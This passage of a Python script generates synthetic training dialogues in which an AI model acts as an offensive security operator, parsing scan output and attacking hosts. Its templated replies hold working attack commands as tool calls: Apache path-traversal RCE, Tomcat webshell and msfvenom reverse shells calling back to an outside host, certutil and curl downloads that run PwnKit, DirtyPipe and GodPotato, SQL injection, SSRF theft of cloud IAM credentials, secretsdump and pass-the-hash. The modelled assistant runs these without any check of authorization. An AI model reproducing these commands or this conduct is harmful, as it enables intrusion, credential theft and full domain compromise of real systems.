        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_recon_output_parsing():
    """Output parsing and next-step decisions."""
    samples = []
    # Generates ~700 from 3 scenarios * loop
    scenarios = [
        {
            "output_type": "nmap",
            "output": lambda ip: f"""PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http         Apache httpd 2.4.49
443/tcp  open  ssl/http     Apache httpd 2.4.49
3306/tcp open  mysql        MySQL 5.7.38
8080/tcp open  http-proxy   Squid http proxy 4.13
| http-title: 401 Unauthorized
| http-server-header: Apache/2.4.49 (Ubuntu)
| ssl-cert: Subject: CN=*.{rand_domain()}""",
            "analysis": lambda ip: f"""**Critical findings from this scan:**

1. **Apache 2.4.49** (ports 80, 443) — This version is vulnerable to **CVE-2021-41773** (path traversal) and **CVE-2021-42013** (RCE via path traversal). This is a CRITICAL finding.

2. **MySQL 5.7.38** (port 3306) — Exposed database port. Check for:
   - Default/weak credentials
   - Remote root login enabled
   - UDF exploitation if we get credentials

3. **Squid proxy 4.13** (port 8080) — Open proxy could allow:
   - Internal network scanning through the proxy
   - Cache poisoning attacks
   - Access to internal-only services

**Immediate actions:**
<exec timeout="30">curl -s "http://{ip}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"</exec>

This tests CVE-2021-41773 path traversal on Apache 2.4.49. If successful, we have arbitrary file read and potentially RCE.""",
        },
        {
            "output_type": "gobuster",
            "output": lambda ip: f"""===============================================================
Gobuster v3.6
===============================================================
[+] Url:          http://{ip}
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
/admin                (Status: 302) [Size: 0] [--> /admin/login]
/api                  (Status: 200) [Size: 43]
/backup               (Status: 403) [Size: 278]
/config               (Status: 403) [Size: 278]
/.git                 (Status: 301) [Size: 315] [--> http://{ip}/.git/]
/uploads              (Status: 301) [Size: 319]
/internal             (Status: 401) [Size: 456]
/debug                (Status: 200) [Size: 8734]
/server-status        (Status: 200) [Size: 12543]
/phpmyadmin           (Status: 200) [Size: 9834]""",
            "analysis": lambda ip: f"""**High-value directories discovered:**

1. **/.git** (301) — **CRITICAL**: Exposed git repository. Can extract full source code including:
   <exec timeout="60">git-dumper http://{ip}/.git /tmp/dumped_repo</exec>
   - Credentials in commit history
   - Application logic for vulnerability identification
   - Configuration files with secrets

2. **/debug** (200) — Debug endpoint accessible. May contain:
   - Stack traces with internal paths
   - Environment variables
   - Database connection strings

3. **/server-status** (200) — Apache mod_status exposed:
   - Active connections and request URLs
   - Internal IP addresses
   - Request patterns for other hidden endpoints

4. **/phpmyadmin** (200) — Database management interface:
   - Try default credentials (root:, root:root, admin:admin)
   - Check for known phpMyAdmin vulnerabilities

5. **/admin** (302 → login) — Admin panel exists:
   - Brute force with common credentials
   - Check for registration bypass
   - Test for SQLi in login form

**Priority order:** .git → debug → phpmyadmin → admin → server-status""",
        },
        {
            "output_type": "nuclei",
            "output": lambda ip: f"""[CVE-2024-23897] [critical] http://jenkins.{rand_domain()} [Jenkins 2.441]
[git-config] [medium] http://{ip}/.git/config
[exposed-panels:phpmyadmin] [info] http://{ip}/phpmyadmin/
[default-login:tomcat] [high] http://{ip}:8080/manager/html [tomcat:s3cret]
[tech-detect:apache] [info] http://{ip} [Apache/2.4.49]
[CVE-2021-41773] [critical] http://{ip}/cgi-bin
[open-redirect] [medium] http://{ip}/redirect?url=https://evil.com
[cors-misconfig] [low] http://{ip}/api [Access-Control-Allow-Origin: *]""",
            "analysis": lambda ip: f"""**Nuclei findings prioritized by severity:**

**CRITICAL:**
1. **CVE-2024-23897** — Jenkins arbitrary file read. Exploit immediately:
   <exec timeout="60">python3 jenkins_cli_exploit.py -u http://jenkins.{rand_domain()} -f /var/jenkins_home/credentials.xml</exec>

2. **CVE-2021-41773** — Apache path traversal to RCE:
   <exec timeout="30">curl -s --path-as-is "http://{ip}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; id"</exec>

**HIGH:**
3. **Default Tomcat credentials** (tomcat:s3cret) — Deploy webshell:
   <exec timeout="60">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o /tmp/shell.war && curl -u tomcat:s3cret --upload-file /tmp/shell.war "http://{ip}:8080/manager/text/deploy?path=/shell"</exec>

**MEDIUM:**
4. **Git config exposed** — Full source code extraction possible
5. **Open redirect** — Useful for phishing chains

**Exploitation order:** CVE-2021-41773 (fastest RCE) → Tomcat default creds → Jenkins file read → Git dump""",
        },
    ]

    for _ in range(700):
        ip = rand_ip()
        scenario = random.choice(scenarios)
        output = scenario["output"](ip)
        analysis = scenario["analysis"](ip)

        user = random.choice([
            f"Here's the {scenario['output_type']} output. What does this tell us and what should we do next?\n\n```\n{output}\n```",
            f"Interpret these {scenario['output_type']} results and recommend next steps:\n\n```\n{output}\n```",
            f"Analyze this {scenario['output_type']} scan output:\n\n```\n{output}\n```",
        ])

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, analysis))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 2: EXPLOITATION (5,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_exploit_cve_triage():
    """CVE triage: given CVE + service version, determine exploitability."""
    samples = []

    for _ in range(1000):
        cve = random.choice(CVES_CRITICAL)
        cve_id, name, product, desc, cwe, cvss = cve
        target = rand_ip()
        port = random.choice([80, 443, 8080, 8443, 61616, 22, 445, 3389])

        version_key = product.split()[0].lower()
        if version_key in SERVICE_VERSIONS:
            version = random.choice(SERVICE_VERSIONS[version_key])
        else:
            version = f"{random.randint(1,10)}.{random.randint(0,20)}.{random.randint(0,50)}"

        exploitable = random.random() > 0.3

        user = random.choice([
            f"Target {target}:{port} is running {product} version {version}. Is it vulnerable to {cve_id}?",
            f"Triage {cve_id} ({name}) against {product} {version} on {target}",
            f"Can we exploit {cve_id} on {target}? Running {product} {version}.",
        ])

        if exploitable:
            assistant = f"""**CVE Triage: {cve_id} ({name})**

| Field | Value |
|-------|-------|
| CVE | {cve_id} |
| Target | {target}:{port} |
| Product | {product} {version} |
| CVSS | {cvss} ({cwe}) |
| Exploitable | **YES** |

**Assessment:** Version {version} of {product} falls within the vulnerable range for {cve_id}. {desc}

**Exploitation approach:**
1. {"Use publicly available PoC exploit" if random.random() > 0.4 else "Adapt the exploit for this specific version"}
2. {"No authentication required — unauthenticated RCE" if cvss >= 9.5 else "May need valid credentials or specific conditions"}
3. {"CISA KEV listed — known exploited in the wild" if random.random() > 0.3 else "Exploit available but requires manual adaptation"}

**Recommended command:**
<exec timeout="120">{"nuclei -u http://" + target + ":" + str(port) + " -id " + cve_id.lower().replace("-", "_") if random.random() > 0.5 else "python3 exploit_" + cve_id.lower().replace("-", "_") + ".py -t " + target + " -p " + str(port)}</exec>

**Risk factors:**
- {"Reliable exploit — high success probability" if random.random() > 0.5 else "Exploit may crash the service — confirm with client before attempting"}
- {"Stealthy — minimal logging" if random.random() > 0.6 else "Noisy — will likely trigger IDS/SIEM alerts"}

<finding severity="critical" target="{target}:{port}">{cve_id} ({name}) — {product} {version} confirmed vulnerable. {desc}</finding>"""
        else:
            assistant = f"""**CVE Triage: {cve_id} ({name})**

| Field | Value |
|-------|-------|
| CVE | {cve_id} |
| Target | {target}:{port} |
| Product | {product} {version} |
| CVSS | {cvss} ({cwe}) |
| Exploitable | **NO / UNLIKELY** |

**Assessment:** Version {version} of {product} appears to be {"patched against" if random.random() > 0.5 else "outside the affected range for"} {cve_id}. The vulnerability affects {"earlier versions" if random.random() > 0.5 else "a specific configuration not present here"}.

**Why not exploitable:**
- {"Version {version} includes the security fix" if random.random() > 0.5 else "Required preconditions not met (specific module/config needed)"}
- {"Vendor advisory confirms this version is not affected" if random.random() > 0.5 else "Exploit requires features that are disabled by default in this version"}

**Alternative approaches:**
1. Check for other CVEs affecting {product} {version}
2. Look for misconfigurations rather than known CVEs
3. {"Test for default credentials" if random.random() > 0.5 else "Attempt authentication bypass via other vectors"}
4. Move on to other targets with confirmed vulnerabilities"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_exploit_web_attacks():
    """Web application attacks: SQLi, SSRF, XSS, auth bypass, IDOR, LFI."""
    samples = []

    attack_types = [
        {
            "type": "sqli",
            "name": "SQL Injection",
            "scenarios": [
                {
                    "user": "Test the search parameter on {url}/api/search?q=test for SQL injection",
                    "cmd": "sqlmap -u \"{url}/api/search?q=test\" --batch --risk 3 --level 5 --dbs --technique=BEUSTQ",
                    "output": """[INFO] testing connection to the target URL
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] parameter 'q' appears to be 'AND boolean-based blind' injectable
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE clause'
[INFO] parameter 'q' is 'MySQL >= 5.0 AND error-based' injectable
[INFO] target URL appears to be UNION query injectable
sqlmap identified the following injection point:
Parameter: q (GET)
    Type: boolean-based blind
    Type: error-based
    Type: UNION query
---
available databases [3]:
[*] information_schema
[*] app_production
[*] mysql""",
                    "next": "Dump the app_production database: sqlmap -u \"{url}/api/search?q=test\" --batch -D app_production --tables",
                },
                {
                    "user": "I found a login form at {url}/login. Test for authentication bypass via SQLi",
                    "cmd": "sqlmap -u \"{url}/login\" --data=\"username=admin&password=test\" --batch --risk 3 --level 5 --technique=B",
                    "output": """[INFO] testing 'OR boolean-based blind'
[INFO] parameter 'username' appears to be 'OR boolean-based blind' injectable
[INFO] testing authentication bypass payloads
[PAYLOAD] admin' OR '1'='1'-- -
[SUCCESS] Authentication bypassed with payload: admin' OR '1'='1'-- -""",
                    "next": "Access the admin panel with the bypass payload and enumerate functionality",
                },
            ],
        },
        {
            "type": "ssrf",
            "name": "Server-Side Request Forgery",
            "scenarios": [
                {
                    "user": "The /api/fetch endpoint on {url} takes a URL parameter. Test for SSRF",
                    "cmd": "curl -s \"{url}/api/fetch?url=http://169.254.169.254/latest/meta-data/\"",
                    "output": """ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
network/
placement/
security-credentials/""",
                    "next": "Extract IAM credentials: curl -s \"{url}/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
                },
                {
                    "user": "Found a PDF generator at {url}/generate-pdf that takes a URL for content. Test SSRF",
                    "cmd": "curl -X POST \"{url}/generate-pdf\" -d '{{\"content_url\": \"http://127.0.0.1:6379/INFO\"}}' -H 'Content-Type: application/json'",
                    "output": """# Server
redis_version:6.2.7
redis_mode:standalone
os:Linux 5.15.0-86-generic x86_64
tcp_port:6379
connected_clients:3
used_memory:1847592""",
                    "next": "Redis is accessible internally without auth. Chain SSRF to Redis for RCE via crontab write",
                },
            ],
        },
        {
            "type": "idor",
            "name": "Insecure Direct Object Reference",
            "scenarios": [
                {
                    "user": "I'm authenticated as user ID 1042 on {url}. The API endpoint /api/users/1042/profile returns my data. Check for IDOR",
                    "cmd": "for i in $(seq 1 1050); do curl -s -H 'Authorization: Bearer {token}' \"{url}/api/users/$i/profile\" | jq -r '.email // empty'; done",
                    "output": """admin@company.com
ceo@company.com
cfo@company.com
developer1@company.com
...
(1042 user records accessible)""",
                    "next": "All user profiles accessible. Check /api/users/1/settings for admin account modification",
                },
                {
                    "user": "The application has order endpoints at {url}/api/orders/ORD-10042. I can see my order. Check if I can access others",
                    "cmd": "for i in $(seq 10001 10050); do echo \"ORD-$i: $(curl -s -o /dev/null -w '%{{http_code}}' -H 'Cookie: session={session}' \"{url}/api/orders/ORD-$i\")\"; done",
                    "output": """ORD-10001: 200
ORD-10002: 200
ORD-10003: 200
...
ORD-10042: 200 (our order)
...
ORD-10050: 200
All orders accessible regardless of ownership.""",
                    "next": "Confirmed horizontal IDOR. Extract sensitive order data (PII, payment info) from other users' orders",
                },
            ],
        },
        {
            "type": "lfi",
            "name": "Local File Inclusion",
            "scenarios": [
                {
                    "user": "The application at {url} has a file parameter: /view?file=report.pdf. Test for LFI",
                    "cmd": "curl -s \"{url}/view?file=../../../etc/passwd\"",
                    "output": """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false""",
                    "next": "LFI confirmed. Read sensitive files: /etc/shadow (if readable), application config, SSH keys, environment variables",
                },
                {
                    "user": "Found a template parameter on {url}/page?template=home.html. Could this be LFI/RFI?",
                    "cmd": "curl -s \"{url}/page?template=....//....//....//etc/passwd\"",
                    "output": """root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin""",
                    "next": "Double-dot bypass works. Try log poisoning: inject PHP into User-Agent, then include /var/log/apache2/access.log for RCE",
                },
            ],
        },
        {
            "type": "auth_bypass",
            "name": "Authentication Bypass",
            "scenarios": [
                {
                    "user": "The admin panel at {url}/admin returns 401. Find a way to bypass authentication",
                    "cmd": "curl -s -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin' \"{url}/anything\"",
                    "output": """HTTP/1.1 200 OK
Content-Type: text/html
...
<h1>Admin Dashboard</h1>
<a href="/admin/users">Manage Users</a>
<a href="/admin/config">System Configuration</a>""",
                    "next": "Auth bypassed via X-Original-URL header override. Enumerate admin functionality and escalate",
                },
                {
                    "user": "JWT-based auth on {url}. I have a user token. Can we escalate to admin?",
                    "cmd": "python3 jwt_tool.py {token} -X a -T",
                    "output": """[+] Algorithm: HS256
[+] Trying algorithm confusion (RS256→HS256)...
[+] Trying 'none' algorithm...
[+] 'none' algorithm ACCEPTED!
[+] Forged token with 'role': 'admin' accepted by server
[+] Admin access confirmed""",
                    "next": "JWT none algorithm bypass works. Generate admin token and access all administrative endpoints",
                },
            ],
        },
    ]

    for _ in range(1200):
        attack = random.choice(attack_types)
        scenario = random.choice(attack["scenarios"])
        url = f"http{'s' if random.random() > 0.5 else ''}://{rand_subdomain()}"
        ip = rand_ip()
        token = rand_hash("sha256")[:40]
        session = rand_hash("md5")

        user_msg = scenario["user"].format(url=url, token=token, session=session)
        cmd = scenario["cmd"].format(url=url, token=token, session=session)
        output = scenario["output"]
        next_step = scenario["next"].format(url=url, token=token, session=session)

        assistant = f"""**Testing for {attack["name"]}**

<exec timeout="60">{cmd}</exec>

```
{output}
```

<finding severity="{"critical" if attack["type"] in ["sqli", "ssrf", "auth_bypass"] else "high"}" target="{url}">{attack["name"]} confirmed. {next_step.split('.')[0]}.</finding>

**Impact:**
- {"Full database access — can extract all data" if attack["type"] == "sqli" else ""}{"Internal service access — cloud metadata, internal network" if attack["type"] == "ssrf" else ""}{"Access to all user data — PII exposure" if attack["type"] == "idor" else ""}{"Arbitrary file read on the server" if attack["type"] == "lfi" else ""}{"Full admin access without credentials" if attack["type"] == "auth_bypass" else ""}

**Next step:** {next_step}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, assistant))

    return samples


def gen_exploit_impacket():
    """Impacket suite usage."""
    samples = []

    impacket_tools = [
        {
            "tool": "secretsdump",
            "scenarios": [
                {
                    "user": "Dump credentials from {dc} using domain admin creds {domain}/{user}:{password}",
                    "cmd": "impacket-secretsdump {domain}/{user}:{password}@{dc}",
                    "output": """Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8a2b4c...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/jsmith:$DCC2$10240#jsmith#a3b2c1d4e5f6...
CORP.LOCAL/admin:$DCC2$10240#admin#f6e5d4c3b2a1...
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\\DC01$:aes256-cts-hmac-sha1-96:abcdef1234567890...
[*] DPAPI_SYSTEM
[*] NL$KM
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21ce2c4f3c8e4c2a4d5e6f7a8b9c0d1:::
jsmith:1103:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::""",
                },
            ],
        },
        {
            "tool": "psexec",
            "scenarios": [
                {
                    "user": "Get a shell on {target} using pass-the-hash with the admin NTLM hash {hash}",
                    "cmd": "impacket-psexec -hashes :{hash} {domain}/Administrator@{target}",
                    "output": """Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on {target}...
[*] Found writable share ADMIN$
[*] Uploading file to ADMIN$
[*] Opening SVCManager on {target}...
[*] Creating service on {target}...
[*] Starting service on {target}...
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system""",
                },
            ],
        },
        {
            "tool": "wmiexec",
            "scenarios": [
                {
                    "user": "Execute commands on {target} via WMI using {domain}/{user}:{password}",
                    "cmd": "impacket-wmiexec {domain}/{user}:{password}@{target}",
                    "output": """Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Ticket based
[!] Press help for extra shell commands
C:\\> whoami
{domain}\\{user}
C:\\> hostname
{hostname}""",
                },
            ],
        },
        {
            "tool": "GetUserSPNs",
            "scenarios": [
                {
                    "user": "Kerberoast service accounts on {domain} using {user}:{password}",
                    "cmd": "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc} -request -outputfile /tmp/kerberoast.txt",
                    "output": """Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName          Name        MemberOf                           PasswordLastSet
----------------------------  ----------  ---------------------------------  -------------------
MSSQLSvc/SQL01.{domain}       svc_sql     CN=Service Accounts,DC=corp,DC=local  2023-06-15 10:22:33
HTTP/WEB01.{domain}           svc_web     CN=Service Accounts,DC=corp,DC=local  2024-01-03 14:55:12
CIFS/BACKUP01.{domain}        svc_backup  CN=Backup Operators,DC=corp,DC=local  2022-11-20 08:30:00

[*] Requesting TGS tickets for 3 SPN(s)...
[*] Saved to /tmp/kerberoast.txt""",
                },
            ],
        },
        {
            "tool": "GetNPUsers",
            "scenarios": [
                {
                    "user": "Check for AS-REP roastable accounts on {domain}",
                    "cmd": "impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile /tmp/domain_users.txt -format hashcat -outputfile /tmp/asrep.txt",
                    "output": """Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for svc_legacy
$krb5asrep$23$svc_legacy@{domain}:a8b7c6d5e4f3...
[*] Getting TGT for old_admin
$krb5asrep$23$old_admin@{domain}:1a2b3c4d5e6f...
[*] User normal_user doesn't have UF_DONT_REQUIRE_PREAUTH set

Saved 2 hashes to /tmp/asrep.txt""",
                },
            ],
        },
    ]

    for _ in range(900):
        tool_data = random.choice(impacket_tools)
        scenario = random.choice(tool_data["scenarios"])
        domain = "corp.local"
        dc = rand_ip()
        target = rand_ip()
        user_name = random.choice(USERNAMES[:10])
        password = random.choice(PASSWORDS[:10])
        nt_hash = rand_hash("md5")
        hostname = f"SRV{random.randint(1,99):02d}"

        user_msg = scenario["user"].format(
            dc=dc, domain=domain, user=user_name, password=password,
            target=target, hash=nt_hash, hostname=hostname
        )
        cmd = scenario["cmd"].format(
            dc=dc, domain=domain, user=user_name, password=password,
            target=target, hash=nt_hash, hostname=hostname
        )
        output = scenario["output"].format(
            dc=dc, domain=domain, user=user_name, password=password,
            target=target, hash=nt_hash, hostname=hostname
        )

        assistant = f"""<exec timeout="120">{cmd}</exec>

```
{output}
```

<finding severity="high" target="{target}">{tool_data["tool"]} successful — {"credentials dumped" if tool_data["tool"] == "secretsdump" else "SYSTEM shell obtained" if tool_data["tool"] == "psexec" else "remote command execution" if tool_data["tool"] == "wmiexec" else "service account hashes extracted"}</finding>

**Result:** {"Domain credentials dumped including krbtgt hash — full domain compromise achieved" if tool_data["tool"] == "secretsdump" else "SYSTEM-level shell on " + target + " — highest privilege" if tool_data["tool"] == "psexec" else "Command execution as " + user_name + " on " + target if tool_data["tool"] == "wmiexec" else "TGS tickets extracted — crack offline with hashcat -m 13100" if tool_data["tool"] == "GetUserSPNs" else "AS-REP hashes obtained — crack with hashcat -m 18200"}

**Next steps:**
1. {"Use krbtgt hash for Golden Ticket attack" if tool_data["tool"] == "secretsdump" else "Dump credentials from this host" if tool_data["tool"] == "psexec" else "Enumerate host for sensitive data" if tool_data["tool"] == "wmiexec" else "Crack hashes with hashcat and rockyou.txt + rules"}
2. {"Check for password reuse across the domain" if tool_data["tool"] == "secretsdump" else "Pivot to additional hosts" if tool_data["tool"] in ["psexec", "wmiexec"] else "Test cracked credentials for lateral movement"}
3. {"Establish persistence via scheduled task or registry" if tool_data["tool"] in ["psexec", "wmiexec"] else "Document evidence for report"}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, assistant))

    return samples


def gen_exploit_privesc():
    """Privilege escalation (Linux and Windows)."""
    samples = []

    linux_privesc = [
        {
            "technique": "SUID binary",
            "user": "I have a shell as www-data on {target}. Find SUID binaries for privilege escalation",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "output": """/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/python3.8
/usr/bin/find
/usr/local/bin/backup_tool""",
            "exploit": """**SUID escalation vectors found:**

1. **python3.8** (SUID) — Immediate root:
<exec timeout="10">/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'</exec>

2. **find** (SUID) — Root via exec:
<exec timeout="10">find . -exec /bin/sh -p \\; -quit</exec>

3. **pkexec** (SUID) — Check for CVE-2021-4034 (PwnKit):
<exec timeout="30">curl -L https://github.com/ly4k/PwnKit/raw/main/PwnKit -o /tmp/pwnkit && chmod +x /tmp/pwnkit && /tmp/pwnkit</exec>

Using python3.8 SUID for cleanest escalation:
```
$ /usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

<finding severity="critical" target="{target}">Privilege escalation via SUID python3.8. Got root shell.</finding>""",
        },
        {
            "technique": "Linux capabilities",
            "user": "Check for capability-based privesc on {target}. I'm running as the app user",
            "cmd": "getcap -r / 2>/dev/null",
            "output": """/usr/bin/python3.8 cap_setuid=ep
/usr/bin/perl cap_setuid+ep
/usr/sbin/tcpdump cap_net_raw+ep
/opt/app/node cap_net_bind_service+ep""",
            "exploit": """**Capability escalation vectors:**

1. **python3.8** with `cap_setuid` — Can set UID to 0 (root):
<exec timeout="10">/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</exec>

2. **perl** with `cap_setuid` — Same escalation path:
<exec timeout="10">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'</exec>

Using python3.8 cap_setuid:
```
$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id
uid=0(root) gid=1001(app) groups=1001(app)
```

<finding severity="critical" target="{target}">Privilege escalation via cap_setuid on python3.8. Root obtained.</finding>""",
        },
        {
            "technique": "Sudo misconfiguration",
            "user": "Check sudo permissions for privilege escalation on {target}",
            "cmd": "sudo -l",
            "output": """Matching Defaults entries for www-data on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/less /var/log/*
    (root) NOPASSWD: /opt/scripts/backup.sh""",
            "exploit": """**Sudo escalation vectors found:**

1. **vim** as ALL with NOPASSWD — Immediate root:
<exec timeout="10">sudo vim -c ':!/bin/bash'</exec>

2. **less** with wildcard — Can read any file via path traversal:
<exec timeout="10">sudo /usr/bin/less /var/log/../../etc/shadow</exec>

3. **backup.sh** — Check if script is writable or injectable:
<exec timeout="10">ls -la /opt/scripts/backup.sh && cat /opt/scripts/backup.sh</exec>

Using vim for cleanest root shell:
```
$ sudo vim -c ':!/bin/bash'
# id
uid=0(root) gid=0(root) groups=0(root)
```

<finding severity="critical" target="{target}">Privilege escalation via sudo vim. Root shell obtained.</finding>""",
        },
        {
            "technique": "Kernel exploit",
            "user": "I'm on {target} as a low-priv user. Kernel is Linux 5.8.0. Check for kernel exploits",
            "cmd": "uname -a && cat /etc/os-release",
            "output": """Linux target 5.8.0-63-generic #71-Ubuntu SMP Tue 2021-09-14 13:32:01 UTC x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu""",
            "exploit": """**Kernel exploit analysis:**

Linux 5.8.0-63 on Ubuntu 20.04 — multiple potential exploits:

1. **CVE-2022-0847 (DirtyPipe)** — Affects 5.8+:
<exec timeout="60">curl -L https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c -o /tmp/dp.c && gcc /tmp/dp.c -o /tmp/dirtypipe && /tmp/dirtypipe /etc/passwd 1 "${openssl_hash}:0:0:root:/root:/bin/bash"</exec>

2. **CVE-2021-4034 (PwnKit)** — pkexec is likely present:
<exec timeout="30">curl -L https://github.com/ly4k/PwnKit/raw/main/PwnKit -o /tmp/pwnkit && chmod +x /tmp/pwnkit && /tmp/pwnkit</exec>

3. **CVE-2022-2588 (DirtyCred)** — Affects this kernel range

DirtyPipe is most reliable for 5.8.x:
```
$ /tmp/dirtypipe /etc/passwd 1 "hacker:$6$salt$hash:0:0::/root:/bin/bash"
[+] Overwriting /etc/passwd at offset 1
[+] Success! Root entry written.
$ su hacker
# id
uid=0(root) gid=0(root)
```

<finding severity="critical" target="{target}">Privilege escalation via CVE-2022-0847 (DirtyPipe). Root access achieved on kernel 5.8.0.</finding>""",
        },
    ]

    windows_privesc = [
        {
            "technique": "Token impersonation",
            "user": "I have a shell as IIS AppPool on {target} (Windows Server 2019). Escalate to SYSTEM",
            "cmd": "whoami /priv",
            "output": """PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled""",
            "exploit": """**SeImpersonatePrivilege is ENABLED — potato attack viable!**

For Windows Server 2019, use **GodPotato** or **PrintSpoofer**:

<exec timeout="60">certutil -urlcache -split -f http://10.10.14.5:8000/GodPotato.exe C:\\Temp\\gp.exe && C:\\Temp\\gp.exe -cmd "cmd /c whoami"</exec>

```
C:\\> C:\\Temp\\gp.exe -cmd "cmd /c whoami"
[*] ComSvcs.dll loaded successfully
[*] Token impersonation successful
nt authority\\system
```

Get a reverse shell as SYSTEM:
<exec timeout="30">C:\\Temp\\gp.exe -cmd "C:\\Temp\\nc.exe 10.10.14.5 4444 -e cmd.exe"</exec>

<finding severity="critical" target="{target}">Privilege escalation from IIS AppPool to SYSTEM via SeImpersonatePrivilege + GodPotato.</finding>""",
        },
        {
            "technique": "Unquoted service path",
            "user": "Check for unquoted service paths on {target} for privilege escalation",
            "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
            "output": """Backup Service   BackupSvc   C:\\Program Files\\Backup Tools\\Service\\backup.exe   Auto
Update Agent     UpdateSvc   C:\\Program Files\\Corp Update\\Agent\\update.exe    Auto""",
            "exploit": """**Unquoted service path found!**

`C:\\Program Files\\Backup Tools\\Service\\backup.exe` — Windows will try:
1. `C:\\Program.exe`
2. `C:\\Program Files\\Backup.exe` ← We can write here if writable
3. `C:\\Program Files\\Backup Tools\\Service\\backup.exe`

Check write permissions:
<exec timeout="10">icacls "C:\\Program Files\\Backup Tools"</exec>

```
C:\\Program Files\\Backup Tools BUILTIN\\Users:(W)
                                NT AUTHORITY\\SYSTEM:(F)
```

**Users have write access!** Place payload:
<exec timeout="30">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o C:\\Program Files\\Backup Tools\\Backup.exe</exec>
<exec timeout="10">sc stop BackupSvc && sc start BackupSvc</exec>

When the service restarts, our payload executes as SYSTEM.

<finding severity="critical" target="{target}">Unquoted service path + writable directory = SYSTEM shell via Backup.exe hijack.</finding>""",
        },
    ]

    all_privesc = linux_privesc + windows_privesc
    for _ in range(900):
        privesc = random.choice(all_privesc)
        target = rand_ip()

        user_msg = privesc["user"].format(target=target)
        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, privesc["exploit"].format(target=target, openssl_hash="$6$salt$hash")))

    return samples


def gen_exploit_credential_attacks():
    """Credential attacks (hashcat, spraying, wordlists)."""
    samples = []

    hash_types = [
        ("$2b$12$LJ3m4sMKxV6Z9.rUwH7RYeWQRnIBl2JpI5kDUFOqW.6z7Y3gKMrIO", 3200, "bcrypt", "slow — ~50 KH/s on GPU"),
